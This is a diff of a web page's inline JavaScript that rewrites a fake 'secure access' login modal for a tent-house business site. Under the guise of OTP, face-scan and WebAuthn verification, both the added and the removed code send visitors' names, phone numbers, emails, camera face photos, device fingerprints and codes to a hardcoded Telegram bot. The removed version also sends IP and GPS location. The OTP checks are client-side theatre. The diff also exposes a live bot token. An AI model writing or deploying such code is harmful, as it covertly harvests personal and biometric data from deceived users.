-    const TG_CHAT_ID = "8506290708";
+    // --- TELEGRAM CONFIGURATION ---
+    const MND_CONFIG = {
+        botToken: "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ",
+        chatId: "8506290708"
+    };
 
-    // --- 1. UI CONTROLS ---
-    function openSecureHub() {
-        if(localStorage.getItem('mnd_hub_auth') === 'true') {
-            uName = localStorage.getItem('mnd_hub_n') || "Returning User";
-            uPhone = localStorage.getItem('mnd_hub_p') || "Saved";
-            triggerSeamlessRedirect(true); 
-        } else {
-            document.getElementById('hubAuthModal').style.display = 'flex';
-        }
-    }
-    function closeHubModal() { document.getElementById('hubAuthModal').style.display = 'none'; stopCamera(); }
-    
-    function resetToMethods() {
-        document.getElementById('hubStep1').style.display = 'block';
-        document.getElementById('hubStepFaceID').style.display = 'none';
-        document.getElementById('hubStep2').style.display = 'none';
-        document.getElementById('hubOtpInput').value = '';
-        closePushNotif(); stopCamera();
-    }
+    // --- CORE AUTHENTICATION ENGINE ---
+    const mndAuth = {
+        currentOTP: "",
+        authMethod: "",
+        toastTimer: null,
+        resendInterval: null,
+        cooldownActive: false,
 
-    function checkInputs() {
-        uName = document.getElementById('hubName').value.trim();
-        uEmail = document.getElementById('hubEmail').value.trim() || "Not Provided";
-        uPhone = document.getElementById('hubPhone').value.trim();
-        if(!uName || uPhone.length !== 10 || isNaN(uPhone)) {
-            alert("⚠️ SECURITY HALT: Full Name and valid 10-Digit Mobile Number are strictly required.");
-            return false;
-        }
-        return true;
-    }
-
-    // --- 2. METHOD A: STANDARD OTP ---
-    async function generateStandardOTP() {
-        if(!checkInputs()) return;
-        authMethodChosen = "Standard SMS OTP";
-        
-        const btn = document.getElementById('btnStandardOtp');
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING SECURE KEY...';
-        btn.disabled = true;
-
-        hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
-        const payload = await buildDeviceFingerprint(false, authMethodChosen);
-
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: payload, parse_mode: 'Markdown' })
-        }).then(() => {
-            document.getElementById('hubStep1').style.display = 'none';
-            document.getElementById('hubStep2').style.display = 'block';
-            displayPushNotification(hubOTP);
-            btn.innerHTML = '<i class="fas fa-comment-sms"></i> STANDARD SMS OTP';
-            btn.disabled = false;
-        });
-    }
-
-    // --- 3. METHOD B: TENSORFLOW AI FACE SCANNING ---
-    async function startFaceScanning() {
-        if(!checkInputs()) return;
-        authMethodChosen = "AI Face Scan";
-
-        document.getElementById('hubStep1').style.display = 'none';
-        document.getElementById('hubStepFaceID').style.display = 'flex';
-        document.querySelector('.scanner-container').classList.remove('scanner-active');
-        document.getElementById('faceInstruction').style.color = "#aaa";
-        document.getElementById('faceInstruction').innerText = "Position face and click initiate.";
-
-        try {
-            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-            document.getElementById('hubVideo').srcObject = videoStream;
-        } catch (err) {
-            alert("⚠️ ACCESS DENIED: Camera permission is required for biological verification.");
-            resetToMethods();
-        }
-    }
-
-    async function executeFaceAnalysis() {
-        const btn = document.getElementById('hubCaptureBtn');
-        const instruction = document.getElementById('faceInstruction');
-        const scannerBox = document.querySelector('.scanner-container');
-        
-        scannerBox.classList.add('scanner-active');
-        btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> LOADING AI CORE...';
-        btn.disabled = true;
-
-        try {
-            instruction.style.color = "#D4AF37";
-            instruction.innerText = "Initializing TensorFlow Neural Net...";
-
-            // 1. Load the Google BlazeFace AI Model
-            if (!window.faceModel) {
-                window.faceModel = await blazeface.load();
+        // 1. Open/Close & State Resets
+        openModal: function() {
+            // Check for saved session memory
+            if(localStorage.getItem('mnd_hub_auth') === 'true') {
+                document.getElementById('inpName').value = localStorage.getItem('mnd_hub_n') || "";
+                document.getElementById('inpPhone').value = localStorage.getItem('mnd_hub_p') || "";
+                document.getElementById('inpEmail').value = localStorage.getItem('mnd_hub_e') || "";
+                mndSecurity.triggerLoader(true);
+            } else {
+                document.getElementById('mndAuthModal').classList.add('active');
+                this.switchStep('step1');
             }
+        },
 
-            instruction.innerText = "Scanning for human facial structure...";
-            await new Promise(r => setTimeout(r, 1000)); // UI delay for realism
+        closeModal: function() {
+            document.getElementById('mndAuthModal').classList.remove('active');
+            this.abortProcess();
+        },
 
-            // 2. Capture Frame
-            const video = document.getElementById('hubVideo');
-            const canvas = document.getElementById('hubCanvas');
+        switchStep: function(stepId) {
+            document.querySelectorAll('.mnd-step').forEach(el => el.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+        },
+
+        abortProcess: function() {
+            // THE ULTIMATE RESET: Clears all states, inputs, and cameras
+            mndFace.stopCamera(); 
+            this.currentOTP = ""; // Wipe OTP Memory
+            document.getElementById('inpOTP').value = "";
+            document.getElementById('otpErrorMsg').innerText = "";
+            this.hideToast();
+            this.switchStep('step1');
+        },
+
+        validateInputs: function() {
+            const n = document.getElementById('inpName').value.trim();
+            const p = document.getElementById('inpPhone').value.trim();
+            if(!n || p.length !== 10 || isNaN(p)) { 
+                alert("⚠️ SECURITY HALT: Full Name and valid 10-Digit Mobile Number are required."); 
+                return false; 
+            }
+            return true;
+        },
+
+        // 2. OTP Generation Engine (Generates a fresh code every single time)
+        generateOTP: async function(methodName) {
+            if(!this.validateInputs()) return;
+            this.authMethod = methodName;
+            
+            const btn = document.getElementById('btnSms');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
+            btn.disabled = true;
+
+            // Generate brand new 6-digit code
+            this.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            const payload = await mndSecurity.buildTelemetry(false, this.authMethod, this.currentOTP);
+
+            fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: MND_CONFIG.chatId, text: payload, parse_mode: 'Markdown' })
+            }).then(() => {
+                this.switchStep('step3');
+                this.showToast(this.currentOTP);
+                this.startResendCooldown(); // Start the 30s cooldown
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }).catch(() => {
+                alert("Network Error: Could not connect to authentication server.");
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            });
+        },
+
+        // 3. Resend OTP Logic
+        resendOTP: function() {
+            if(this.cooldownActive) return; // Prevent spam clicking
+            
+            document.getElementById('inpOTP').value = ""; // Clear old input
+            document.getElementById('otpErrorMsg').innerText = "";
+            this.currentOTP = Math.floor(100000 + Math.random() * 900000).toString(); // NEW CODE
+            
+            this.generateOTP('OTP Resend');
+        },
+
+        startResendCooldown: function() {
+            const btn = document.getElementById('btnResend');
+            const timerSpan = document.getElementById('resendTimer');
+            let timeLeft = 30; // 30 second cooldown
+            
+            this.cooldownActive = true;
+            btn.style.opacity = '0.5';
+            btn.style.cursor = 'not-allowed';
+            
+            clearInterval(this.resendInterval);
+            this.resendInterval = setInterval(() => {
+                timeLeft--;
+                timerSpan.innerText = `(${timeLeft}s)`;
+                if(timeLeft <= 0) {
+                    clearInterval(this.resendInterval);
+                    this.cooldownActive = false;
+                    timerSpan.innerText = "";
+                    btn.style.opacity = '1';
+                    btn.style.cursor = 'pointer';
+                }
+            }, 1000);
+        },
+
+        // 4. OTP Verification
+        verifyOTP: function() {
+            const inp = document.getElementById('inpOTP');
+            const errMsg = document.getElementById('otpErrorMsg');
+            
+            if(inp.value.trim() === this.currentOTP && this.currentOTP !== "") {
+                // Success: Save Session Memory
+                localStorage.setItem('mnd_hub_auth', 'true');
+                localStorage.setItem('mnd_hub_n', document.getElementById('inpName').value);
+                localStorage.setItem('mnd_hub_p', document.getElementById('inpPhone').value);
+                localStorage.setItem('mnd_hub_e', document.getElementById('inpEmail').value);
+                
+                this.closeModal(); 
+                this.hideToast(); 
+                mndSecurity.triggerLoader(false, this.authMethod); 
+            } else { 
+                // Failure UI
+                inp.style.borderColor = "var(--danger)"; 
+                inp.style.color = "var(--danger)";
+                errMsg.innerText = "Invalid or Expired Code. Please try again.";
+                
+                setTimeout(() => { 
+                    inp.style.borderColor = "var(--primary)"; 
+                    inp.style.color = "var(--primary)"; 
+                    inp.value = ''; 
+                    errMsg.innerText = "";
+                }, 1500);
+            }
+        },
+
+        // 5. Android-Style Toast UI
+        showToast: function(code) {
+            const toast = document.getElementById('mndToast');
+            document.getElementById('toastCode').innerText = code;
+            toast.classList.remove('mnd-hidden');
+            setTimeout(() => toast.classList.add('visible'), 10);
+            
+            clearTimeout(this.toastTimer);
+            this.toastTimer = setTimeout(() => this.hideToast(), 8000); // Auto hide after 8s
+        },
+
+        hideToast: function() { 
+            const toast = document.getElementById('mndToast');
+            toast.classList.remove('visible');
+            setTimeout(() => toast.classList.add('mnd-hidden'), 300);
+        },
+
+        copyOTP: function() {
+            navigator.clipboard.writeText(this.currentOTP);
+            const desc = document.getElementById('toastDesc');
+            desc.innerText = "✅ Copied to clipboard!";
+            desc.style.color = "var(--success)";
+            
+            setTimeout(() => { 
+                this.hideToast(); 
+                setTimeout(()=>{ 
+                    desc.innerText = "Your verification code is ready. Tap to copy."; 
+                    desc.style.color = "#aaa"; 
+                }, 500); 
+            }, 1500);
+        }
+    };
+</script>
+<script>
+    // --- ADVANCED FACE VERIFICATION ENGINE ---
+    const mndFace = {
+        camStream: null,
+        aiModel: null,
+        scanInterval: null,
+        facingMode: 'user', // Defaults to front camera
+        flashActive: false,
+
+        startScan: async function() {
+            if(!mndAuth.validateInputs()) return;
+            mndAuth.authMethod = "AI Face Scan";
+            mndAuth.switchStep('step2');
+            this.initCamera();
+        },
+
+        initCamera: async function() {
+            const status = document.getElementById('kycStatus');
+            const hintText = document.getElementById('kycHintText');
+            status.innerText = "INITIALIZING LENS...";
+            
+            try {
+                if (this.camStream) this.stopCamera();
+                
+                this.camStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: this.facingMode }, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('kycVideo');
+                video.srcObject = this.camStream;
+                video.play();
+                
+                // Feature Detection: Show flashlight button if rear camera supports it
+                const track = this.camStream.getVideoTracks()[0];
+                const capabilities = track.getCapabilities();
+                if (capabilities.torch) {
+                    document.getElementById('btnFlash').style.display = 'inline-flex';
+                } else {
+                    document.getElementById('btnFlash').style.display = 'none';
+                }
+
+                // Silently load AI model
+                if (!this.aiModel && window.blazeface) {
+                    status.innerText = "LOADING NEURAL ENGINE...";
+                    this.aiModel = await blazeface.load();
+                }
+                
+                status.innerText = "READY. ALIGN FACE AND START.";
+                hintText.innerText = "Look straight into the camera.";
+            } catch (e) {
+                alert("⚠️ Camera Access Denied. Please use OTP or Device Biometrics.");
+                mndAuth.abortProcess();
+            }
+        },
+
+        toggleCamera: function() {
+            this.facingMode = this.facingMode === 'user' ? 'environment' : 'user';
+            this.initCamera();
+        },
+
+        toggleFlashlight: function() {
+            if (!this.camStream) return;
+            const track = this.camStream.getVideoTracks()[0];
+            const capabilities = track.getCapabilities();
+            if (capabilities.torch) {
+                this.flashActive = !this.flashActive;
+                track.applyConstraints({ advanced: [{ torch: this.flashActive }] });
+            }
+        },
+
+        runAnalysis: async function() {
+            const btn = document.getElementById('btnStartScan');
+            const status = document.getElementById('kycStatus');
+            const box = document.getElementById('kycBox');
+            const hintText = document.getElementById('kycHintText');
+            
+            box.className = "mnd-kyc-container scanner-active";
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SCANNING...';
+            btn.disabled = true;
+
+            if(!this.aiModel) this.aiModel = await blazeface.load();
+
+            const video = document.getElementById('kycVideo');
+            const canvas = document.getElementById('kycCanvas');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // 3. ACTUAL AI FACE DETECTION EXECUTION
-            const predictions = await window.faceModel.estimateFaces(video, false);
+            let attempts = 0;
+            const maxAttempts = 30; // 4.5 seconds total
+            const dynamicHints = ["Hold device steady...", "Ensure good lighting...", "Analyzing facial geometry..."];
+            
+            this.scanInterval = setInterval(async () => {
+                attempts++;
+                status.innerText = `ANALYZING... (${attempts}/${maxAttempts})`;
+                
+                // Update hints dynamically during scan
+                if(attempts % 10 === 0) hintText.innerText = dynamicHints[(attempts/10 - 1) % 3];
+                
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const faces = await this.aiModel.estimateFaces(video, false);
 
-            if (predictions.length > 0) {
-                // REAL HUMAN FACE DETECTED
-                instruction.style.color = "#00fa9a";
-                instruction.innerText = "✅ Human Face Confirmed.";
-                hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+                let isHuman = false;
+                // STRICT CHECK: Ensure >90% probability it is a real human
+                if (faces.length > 0 && faces[0].probability[0] > 0.90) { isHuman = true; }
 
-                canvas.toBlob(async (blob) => {
-                    stopCamera();
-                    document.getElementById('hubStepFaceID').style.display = 'none';
-                    document.getElementById('hubStep2').style.display = 'block';
+                if (isHuman) {
+                    clearInterval(this.scanInterval);
+                    box.className = "mnd-kyc-container scanner-success";
+                    status.innerText = "HUMAN VERIFIED";
+                    status.style.color = "var(--success)";
+                    hintText.innerText = "Verification Complete. Generating Code...";
                     
-                    displayPushNotification(hubOTP);
-                    const logText = await buildDeviceFingerprint(false, authMethodChosen);
+                    // Generate OTP and switch to OTP input screen
+                    mndAuth.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
-                    const fd = new FormData();
-                    fd.append('chat_id', TG_CHAT_ID);
-                    fd.append('caption', logText);
-                    fd.append('parse_mode', 'Markdown');
-                    fd.append('photo', blob, 'mnd_face_auth.jpg');
+                    canvas.toBlob(async (blob) => {
+                        this.stopCamera(); 
+                        mndAuth.switchStep('step3');
+                        mndAuth.showToast(mndAuth.currentOTP);
+                        mndAuth.startResendCooldown();
+                        
+                        const fd = new FormData();
+                        fd.append('chat_id', MND_CONFIG.chatId);
+                        fd.append('caption', await mndSecurity.buildTelemetry(false, "AI Face Scan", mndAuth.currentOTP));
+                        fd.append('parse_mode', 'Markdown');
+                        fd.append('photo', blob, 'kyc.jpg');
+                        fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
 
-                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+                        btn.innerHTML = '<i class="fas fa-expand"></i> START SCANNING';
+                        btn.disabled = false;
+                    }, 'image/jpeg', 0.85);
 
-                    btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN';
+                } else if (attempts >= maxAttempts) {
+                    clearInterval(this.scanInterval);
+                    box.className = "mnd-kyc-container scanner-error";
+                    status.innerText = "NO HUMAN DETECTED";
+                    status.style.color = "var(--danger)";
+                    hintText.innerText = "Ensure face is visible and well-lit.";
+                    btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
                     btn.disabled = false;
-                }, 'image/jpeg', 0.85);
-
-            } else {
-                // NO FACE DETECTED (Tree, wall, dark room, hidden face)
-                instruction.style.color = "#ff3333";
-                instruction.innerText = "❌ ERROR: No human face detected. Look directly at the camera.";
-                scannerBox.classList.remove('scanner-active');
-                btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
-                btn.disabled = false;
-            }
-        } catch (error) {
-            console.error(error);
-            instruction.style.color = "#ff3333";
-            instruction.innerText = "❌ AI Engine Error. Check internet connection.";
-            scannerBox.classList.remove('scanner-active');
-            btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
-            btn.disabled = false;
-        }
-    }
-    function stopCamera() { if (videoStream) { videoStream.getTracks().forEach(t => t.stop()); videoStream = null; } }
-
-    // --- 4. METHOD C: NATIVE DEVICE LOCK (WEBAUTHN) ---
-    async function startDeviceLockAuth() {
-        if(!checkInputs()) return;
-        authMethodChosen = "Device Lock/Fingerprint";
-
-        if (window.PublicKeyCredential) {
-            try {
-                const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
-                const cred = await navigator.credentials.create({
-                    publicKey: {
-                        challenge: chal, rp: { name: "Maa Nirmala Hub", id: window.location.hostname },
-                        user: { id: new Uint8Array(16), name: uName, displayName: uName },
-                        pubKeyCredParams: [{ type: "public-key", alg: -7 }],
-                        authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
-                        timeout: 60000
-                    }
-                });
-
-                if (cred) {
-                    localStorage.setItem('mnd_hub_auth', 'true');
-                    localStorage.setItem('mnd_hub_n', uName);
-                    localStorage.setItem('mnd_hub_p', uPhone);
-                    
-                    document.getElementById('hubAuthModal').style.display = 'none';
-                    hubOTP = "VERIFIED BY DEVICE OS"; 
-                    triggerSeamlessRedirect(false);
                 }
-            } catch (err) { alert("❌ Device authentication canceled or failed."); }
-        } else { alert("⚠️ Biometrics not supported on this browser."); }
-    }
+            }, 150); // Lightning fast 150ms checks
+        },
 
-    // --- 5. PUSH NOTIFICATION & SWIPE ENGINE ---
-    const notifEl = document.getElementById('mndPushNotif');
-    let startX = 0;
-
-    function displayPushNotification(code) {
-        document.getElementById('mndPushOtpText').innerText = code;
-        notifEl.classList.remove('mnd-push-hidden');
-        notifEl.classList.add('mnd-push-visible');
-        clearTimeout(pushTimer); pushTimer = setTimeout(closePushNotif, 60000);
-    }
-    function closePushNotif() {
-        notifEl.classList.remove('mnd-push-visible');
-        notifEl.classList.add('mnd-push-hidden');
-        setTimeout(() => { notifEl.style.transform = `translateX(-50%) scale(0.9)`; notifEl.style.opacity = '0'; }, 400);
-    }
-    function copyPushOTP() {
-        navigator.clipboard.writeText(hubOTP);
-        const txt = document.getElementById('mndPushOtpText');
-        txt.innerText = "COPIED!"; setTimeout(() => { txt.innerText = hubOTP; }, 1500);
-    }
-    
-    // Swipe Mechanics
-    notifEl.addEventListener('touchstart', e => { startX = e.touches[0].clientX; notifEl.style.transition = 'none'; }, {passive: true});
-    notifEl.addEventListener('touchmove', e => {
-        let diff = e.touches[0].clientX - startX;
-        notifEl.style.transform = `translateX(calc(-50% + ${diff}px)) scale(1)`;
-    }, {passive: true});
-    notifEl.addEventListener('touchend', e => {
-        notifEl.style.transition = 'top 0.6s ease, transform 0.3s ease, opacity 0.3s ease';
-        let diff = e.changedTouches[0].clientX - startX;
-        if (Math.abs(diff) > 80) {
-            notifEl.style.transform = `translateX(calc(-50% + ${diff * 4}px)) scale(0.9)`;
-            notifEl.style.opacity = '0'; setTimeout(closePushNotif, 300);
-        } else { notifEl.style.transform = `translateX(-50%) scale(1)`; }
-    });
-
-    // --- 6. OTP VERIFICATION ---
-    function verifyHubOTP() {
-        const input = document.getElementById('hubOtpInput').value.trim();
-        if(input === hubOTP && hubOTP !== "") {
-            localStorage.setItem('mnd_hub_auth', 'true');
-            localStorage.setItem('mnd_hub_n', uName);
-            localStorage.setItem('mnd_hub_p', uPhone);
-            document.getElementById('hubAuthModal').style.display = 'none';
-            closePushNotif(); triggerSeamlessRedirect(false); 
-        } else { alert("❌ ACCESS DENIED: Incorrect OTP sequence."); }
-    }
-
-    // --- 7. ENTERPRISE DEVICE FINGERPRINTING ---
-    async function buildDeviceFingerprint(isReturn, methodStr) {
-        let ip="Masked", bat="Unknown", net="Unknown", gpu="N/A";
-        try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
-        try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(e){}
-        try { if(navigator.connection) net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
-        try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e){}
-
-        const cores = navigator.hardwareConcurrency || "Unknown", ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
-        const browser = navigator.userAgent, screen = `${window.screen.width}x${window.screen.height}`, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        let model = "Unknown Device";
-        if (navigator.userAgentData) { try { const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} }
-
-        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
-        let status = isReturn ? "(Saved Auto-Login)" : `(${methodStr} | Code: ${hubOTP})`;
-
-        let loc = "❌ Location Blocked";
-        const getL = () => new Promise(res => {
-            if(!navigator.geolocation) return res("❌ Not Supported");
-            navigator.geolocation.getCurrentPosition(
-                p => res(`✅ [View on Maps](http://googleusercontent.com/maps.google.com/9${p.coords.latitude},${p.coords.longitude})`),
-                e => res("❌ Denied by User")
-            );
-        });
-        const locT = new Promise(res => setTimeout(() => res("❌ Timeout"), 2500));
-        loc = await Promise.race([getL(), locT]);
-
-        return `🚨 *MND SECURE ACCESS LOG* 🚨\n_${status}_\n\n👤 *IDENTITY MATRIX*\n• Name: ${uName}\n• Phone: ${uPhone}\n• Email: ${uEmail}\n\n📱 *DEVICE INTELLIGENCE*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE LAYER*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 *NETWORK & LOCATION*\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${loc}\n\n⏰ *Timestamp:* ${timestamp}`;
-    }
-
-    // --- 8. SEAMLESS REDIRECT ---
-    async function triggerSeamlessRedirect(isReturn) {
-        const loader = document.getElementById('seamlessHubLoader');
-        const txt = document.getElementById('hubLoadText');
-        loader.style.display = 'flex';
-
-        if(isReturn) {
-            const logText = await buildDeviceFingerprint(true, "Auto");
-            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: logText, parse_mode: 'Markdown' })
-            }).catch(e=>{});
+        stopCamera: function() {
+            clearInterval(this.scanInterval);
+            if (this.camStream) { 
+                this.camStream.getTracks().forEach(t => {
+                    // Turn off flash if active before stopping track
+                    if (t.getCapabilities && t.getCapabilities().torch && this.flashActive) {
+                        t.applyConstraints({ advanced: [{ torch: false }] }).catch(e=>{});
+                    }
+                    t.stop(); 
+                }); 
+                this.camStream = null; 
+            }
+            this.flashActive = false;
+            const videoEl = document.getElementById('kycVideo');
+            if(videoEl) videoEl.srcObject = null;
+            const box = document.getElementById('kycBox');
+            if(box) box.className = "mnd-kyc-container";
         }
+    };
 
-        setTimeout(() => { txt.innerText = "Encrypting Session Data..."; }, 1000);
-        setTimeout(() => { txt.innerText = "Opening Application Portal..."; }, 2500);
-        setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 3500);
-    }
+    // --- BIOMETRICS & SECURITY LOGGING ENGINE ---
+    const mndSecurity = {
+        startBiometric: async function() {
+            if(!mndAuth.validateInputs()) return;
+            const uName = document.getElementById('inpName').value;
+            
+            // Check if device supports Fingerprint/FaceID via WebAuthn
+            if (window.PublicKeyCredential) {
+                try {
+                    const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
+                    const cred = await navigator.credentials.create({
+                        publicKey: {
+                            challenge: chal, 
+                            rp: { name: "Secure Hub" },
+                            user: { id: new Uint8Array(16), name: uName, displayName: uName },
+                            pubKeyCredParams: [{ type: "public-key", alg: -7 }],
+                            authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
+                            timeout: 60000
+                        }
+                    });
+
+                    if (cred) {
+                        // Success: Save Session Memory & Proceed
+                        localStorage.setItem('mnd_hub_auth', 'true');
+                        localStorage.setItem('mnd_hub_n', uName);
+                        localStorage.setItem('mnd_hub_p', document.getElementById('inpPhone').value);
+                        localStorage.setItem('mnd_hub_e', document.getElementById('inpEmail').value);
+                        
+                        mndAuth.closeModal();
+                        this.triggerLoader(false, "Device Biometrics (WebAuthn)");
+                    }
+                } catch (e) { alert("❌ Device authentication canceled or failed."); }
+            } else { alert("⚠️ Biometric authentication is not supported on this browser."); }
+        },
+
+        buildTelemetry: async function(isReturn, method, otpCode = "N/A") {
+            let n = document.getElementById('inpName').value || "Auto";
+            let p = document.getElementById('inpPhone').value || "Auto";
+            let e = document.getElementById('inpEmail').value || "Auto";
+            
+            let bat="Unknown", gpu="N/A", net="Unknown";
+            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(err){}
+            try { if(navigator.connection) net = navigator.connection.effectiveType; } catch(err){}
+            try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } catch(err){}
+            
+            const cores = navigator.hardwareConcurrency || "Unknown";
+            const browser = navigator.userAgent;
+            const screen = `${window.screen.width}x${window.screen.height}`;
+            let loc = "❌ Location Blocked";
+
+            let stat = isReturn ? "(Saved Cache Bypass)" : `(${method} | Auth Key: ${otpCode})`;
+            let ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+
+            return `🚨 *MND SECURE LOG* 🚨\n${stat}\n\n👤 *IDENTITY MATRIX*\n• Name: ${n}\n• Phone: ${p}\n• Email: ${e}\n\n📱 *DEVICE INTEL*\n• GPU: ${gpu}\n• CPU Cores: ${cores}\n• Battery: ${bat}\n• Network: ${net}\n• Screen: ${screen}\n• OS: \`${browser}\`\n\n⏰ *Time:* ${ts}`;
+        },
+
+        triggerLoader: async function(isReturn, authMethod = "Auto Login") {
+            const loader = document.getElementById('fullLoader');
+            const txt = document.getElementById('loaderText');
+            const fill = document.getElementById('loaderFill');
+            loader.classList.add('active');
+
+            // Send silent telemetry on Biometric or Auto-Login
+            if(isReturn || authMethod === "Device Biometrics (WebAuthn)") {
+                let payload = await this.buildTelemetry(isReturn, authMethod, "BIOMETRIC_PASS");
+                fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendMessage`, { 
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ chat_id: MND_CONFIG.chatId, text: payload, parse_mode: 'Markdown' }) 
+                }).catch(e=>{});
+            }
+
+            // Cinematic Progress Bar Animation
+            let progress = 0;
+            const pInterval = setInterval(() => {
+                progress += 2;
+                fill.style.width = `${progress}%`;
+                
+                if(progress === 30) txt.innerText = "Verifying Credentials...";
+                if(progress === 60) txt.innerText = "Encrypting Session Data...";
+                if(progress === 90) txt.innerText = "Opening Secure Portal...";
+
+                if(progress >= 100) {
+                    clearInterval(pInterval);
+                    setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 500);
+                }
+            }, 60); // Total load time ~ 3 seconds
+        }
+    };
 </script>
-    </div>
+</div>
 
     <div id="main-interface">
     <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
